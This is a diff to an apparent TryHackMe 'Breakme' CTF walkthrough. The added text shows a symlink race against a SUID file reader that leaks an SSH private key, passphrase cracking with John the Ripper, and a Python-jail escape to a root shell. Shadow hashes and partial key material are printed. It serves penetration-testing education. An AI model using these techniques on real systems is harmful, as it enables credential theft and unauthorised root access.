@@ -66,7 +66,7 @@ server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration:
 The result above shows us an interesting directory i.e. wordpress, this may tell us that our target runs WordPress CMS. We can confirm our assumption by visiting this directory.
 ![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/1-browse.png)
 
-We can see that our target's web application indeed uses the WordPress CMS. We can start a quick enumeration on the target WordPress instance by enumerating for vulnerable plugins.
+We can see that our target's web application indeed uses the WordPress CMS. We can start a quick enumeration of the target WordPress instance by enumerating vulnerable plugins.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]               
 └─$ wpscan --url http://10.10.64.230/wordpress/ -e vp        
@@ -91,7 +91,7 @@ We can see that our target's web application indeed uses the WordPress CMS. We c
 This enumeration shows that the WordPress instance uses an outdated version of the wp-data-access plugin. Version 5.3.5 used by our target appears to be vulnerable to a privilege escalation vulnerability.
 ![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-discovery.png)
 
-This vulnerability requires us to have an account on the targeted WordPress instance. Now we need to find valid user credentials to log into the WordPress instance. We can do this by first enumerating valid usernames.
+This vulnerability requires us to have an account on the targeted WordPress instance. For this reason, we need to find valid user credentials to log into the WordPress instance. We can do this by first enumerating valid usernames.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]                           
 └─$ wpscan --url http://10.10.64.230/wordpress/ -e u  
@@ -175,7 +175,7 @@ zsh: suspended  nc -lvnp 1234
                                export TERM=xterm
 www-data@Breakme:/var/www/html/wordpress/wp-content/themes/twentytwentythree/patterns$ 
 ```
-Now, we have a foothold on the target and we can use this to enumerate the target further. If we look at the ports listening internally on the target, we will notice and uncommon port listener to the internal IP 127.0.0.1.
+Now, we have a foothold on the target and we can use this to enumerate the target further. If we look at the ports listening internally on the target, we will notice an uncommon port listener to the internal IP 127.0.0.1.
 ```bash
 www-data@Breakme:/tmp$ netstat -nlt
 Active Internet connections (only servers)
@@ -337,8 +337,246 @@ We can load this binary in Cutter and decompile it using the Ghidra decompiler.
 ```
 ![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/readfile-decompile.png)
 
+```c
+// WARNING: [rz-ghidra] Detected overlap for variable buf
+// WARNING: [rz-ghidra] Detected overlap for variable var_1ch
+// WARNING: [rz-ghidra] Detected overlap for variable var_28h
 
+undefined8 main(int argc, char **argv, char **envp) {
+    int32_t iVar1;
+    undefined8 uVar2;
+    int64_t iVar3;
+    char **var_4d0h;
+    char **path;
+    uint64_t var_4bch;
+    int64_t var_4a0h;
+    char *ptr;
+    int32_t var_28h;
+    unsigned long fildes;
+    unsigned long var_20h;
+    uint32_t var_1ch;
+    char *var_18h;
+    char *var_10h;
 
+    var_4bch._0_4_ = argc;
+
+    if (argc == 2) {
+        iVar1 = access(argv[1], 0);
+        if (iVar1 == 0) {
+            iVar1 = getuid();
+            if (iVar1 == 0x3ea) {
+                var_10h = (char *)strstr(argv[1], "flag");
+                var_18h = (char *)strstr(argv[1], "id_rsa");
+                lstat(argv[1], (void *)((int64_t)&var_4bch + 4));
+                var_1ch = (uint32_t)(((uint32_t)var_4a0h & 0xf000) == 0xa000);
+                var_20h = access(argv[1], 4);
+                usleep(0);
+
+                if ((((var_10h == (char *)0x0) && (var_1ch == 0)) && 
+                      (var_20h != 0xffffffff)) && 
+                     (var_18h == (char *)0x0)) {
+                    puts("I guess you won!\n");
+                    fildes = open(argv[1], 0);
+                    if ((int32_t)fildes < 0) {
+                        __assert_fail("fd >= 0 && \"Failed to open the file\"", "readfile.c", 0x26, "main");
+                    }
+                    do {
+                        var_28h = read(fildes, &ptr, 0x400);
+                        if (var_28h < 1) break;
+                        iVar3 = write(1, &ptr, (int64_t)var_28h);
+                    } while (0 < iVar3);
+                    uVar2 = 0;
+                } else {
+                    puts("Nice try!");
+                    uVar2 = 1;
+                }
+            } else {
+                puts("You can't run this program");
+                uVar2 = 1;
+            }
+        } else {
+            puts("File Not Found");
+            uVar2 = 1;
+        }
+    } else {
+        puts("Usage: ./readfile <FILE>");
+        uVar2 = 1;
+    }
+    
+    return uVar2;
+}
+```
+
+This code allows us to read a file after performing some checks. The most important checks are explained below.
+1) The file should be a regular file i.e. not a symbolic link.
+```c
+lstat(argv[1], (void *)((int64_t)&var_4bch + 4));
+var_1ch = (uint32_t)(((uint32_t)var_4a0h & 0xf000) == 0xa000);
+```
+2) The filename should not contain "flag".
+4) The filename should not contain "id_rsa". 
+```c
+var_10h = (char *)strstr(argv[1], "flag");
+var_18h = (char *)strstr(argv[1], "id_rsa");
+if ((((var_10h == (char *)0x0) && (var_1ch == 0)) && 
+      (var_20h != 0xffffffff)) && 
+      (var_18h == (char *)0x0)) {
+<SNIP>
+}
+```
+
+In the code, we can see that the function ```usleep(0);``` is called after it has checked that the file is not a symbolic link and before it checks the content of the filename. This function even though not many lasts for a specific period. We can exploit this by creating two indefinite loops, one that creates a file, changes its state to a symbolic link pointing to Youcef's SSH private, and deletes the file indefinitely, and the second one that runs the program indefinitely. What this will do is that after the state of the normal file created has been verified, during the call of the sleep function the state of the file will be changed by our loop and the file will be read.
+```bash
+john@Breakme:/home/youcef$ while true;do touch ~/test;sleep 0.2;ln -sf /home/youcef/.ssh/id_rsa ~/test;sleep 0.2;rm ~/test;done&
+
+john@Breakme:/home/youcef$ while true; do result=$(./readfile ~/test| grep -v "guess\|Found\|Failed"); [ -n "$result" ] && echo "$result"; done
+-----BEGIN OPENSSH PRIVATE KEY-----                                      
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
+Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z           
+<SNIP>
+yHBxN27qpNoUHbrKHxLx4/UN4z3xcaabtC7BelMsu4RQ3rzGtLS9fhT5e0hoMP+eU3IvMB
+g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
+TabCXd2Ji/Y7UvM=
+-----END OPENSSH PRIVATE KEY-----    
+```
+
+We can see that after a short period, Youcef's private key is printed on the screen. Unfortunately, this key appears to have some problems when we try to connect with it.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ ssh youcef@10.10.230.208 -i youcef_rsa
+Load key "youcef_rsa": error in libcrypto
+youcef@10.10.230.208's password: 
+```
+
+We can change the format of this key using ssh-keygen as a way around this issue.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ ssh-keygen -p -f youcef_rsa -m PEM
+Enter old passphrase:
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ 
+```
+
+The key is protected by a passphrase. Let's use John the Ripper to extract the hashes of the password and crack it.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ ssh2john youcef_rsa > ssh_has
+
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ john ssh_has -wordlist=/usr/share/worlists/rockyou.txt 
+[ssh-opencl] cipher value of 6 is not yet supported with OpenCL!
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+<REDACTED>          (youcef_rsa)     
+1g 0:00:00:12 DONE (2024-09-27 08:15) 0.08032g/s 56.55p/s 56.55c/s 56.55C/s sunshine1..nichole
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+After we have fixed the issue, we can now correct the format of Youcef's SSH key using the command below.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ ssh-keygen -p -f youcef_rsa -m PEM
+Enter old passphrase: 
+Key has comment 'youcef@Breakme'
+Enter new passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved with the new passphrase.    
+```
+
+Now, let's use this key to connect to the target using Youcef's key and read the second flag.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ ssh youcef@10.10.230.208 -i youcef_rsa
+Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64
+<SNIP>
+Last login: Thu Mar 21 07:55:16 2024 from 192.168.56.1
+youcef@Breakme:~$ ls .ssh
+authorized_keys  id_rsa  user2.txt
+```
 
 ## Post Exploitation
 
+We can now enumerate the system using this account. The user Youcef appears to be able to run a Python script as the root user. We can see this by looking at Youcef's sudo rights.
+```bash
+youcef@Breakme:~$ sudo -l
+Matching Defaults entries for youcef on breakme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User youcef may run the following commands on breakme:
+    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
+```
+
+This script looks like the terminal version of the Python programming language but appears to filter everything we type.
+```bash
+youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> print('oasa')
+oasa
+>> a 
+Wrong Input
+>> print('os')  
+Illegal Input
+
+youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever 
+  Or will you BreakMe  
+>> print('OS'.lower())
+Illegal Input
+youcef@Breakme:~$
+```
+
+Words such as system, os, subprocess, import, lower, etc. are all filtered by this script. We can bypass this by using the __builtin__ module that contains built-in functions and objects. Python functions are passed to the __builtin__ module as strings, we can perform case manipulation with the help of the casefold() function which is not filtered by the script to bypass the filter and use OS instead of os. This can be used to read the shadow file as shown below.
+```bash
+youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> 
+>> print('OS'.casefold())
+os
+>> print(__builtins__.__dict__['OPEN'.casefold()])
+<built-in function open>
+>> print(*file)
+root:$y$j9T$DrCC/6peuPA6moD2I.f850$oMujKQSbqtMYZ/ZFQPLsfzWnXZ.hcJtHMRjksIqUgqA:19571:0:99999:7:::
+<SNIP>
+john:$y$j9T$F2iqohP1./v0gBs5Pj8Jw.$ZImaERRcmjCbG517uQF/o5TfYfOIzAIkhPU8ggxO9b6:19569:0:99999:7:::
+youcef:$y$j9T$MpSx6u0o1TWZMfrD7Rq7e/$HOs8S70op1xqv2Hp5PU2nzheS8s1h4U5rh3YOSoUtc.:19570:0:99999:7:::
+```
+
+Cracking this password may be time-consuming for us, so let's use this same method to import the subprocess module and run a shell.
+```bash
+>> s=__builtins__.__dict__['__IMPORT__'.casefold()]('SUBPROCESS'.casefold())
+>> s.run(['WHOAMI'.casefold()])
+root
+>> s.run(['BASH'.casefold()])
+root@Breakme:/home/youcef# cd /root
+root@Breakme:~# ls -la
+total 52
+drwx------  3 root root 4096 Mar 21  2024 .
+drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+-rwx------  1 root root 5438 Jul 31  2023 index.php
+-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
+-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
+-rw-------  1 root root   33 Aug  3  2023 .lesshst
+drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
+-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-------  1 root root   33 Aug  3  2023 .root.txt
+root@Breakme:~# cat .root.txt
+e257d58481412f8772e9fb9fd47d8ca4
+```
+We have successfully bypassed the filters and obtained a shell as the root user. We can use this access to read the third flag present on this machine.
+
+## Conclusion
+
+Congratulations! In this walkthrough, you have exploited a vulnerable WordPress plugin to elevate the compromised account to an administrator role, performed reverse engineering on a binary with SUID bit to exploit the binary's checks, and escaped a Python jail shell. This machine was designed to show how poor patching practices could seriously affect the security posture of an organisation. In a real-world assessment, the last step will be to gather our findings and draft a report for our clients. Thanks for following up on this walkthrough.
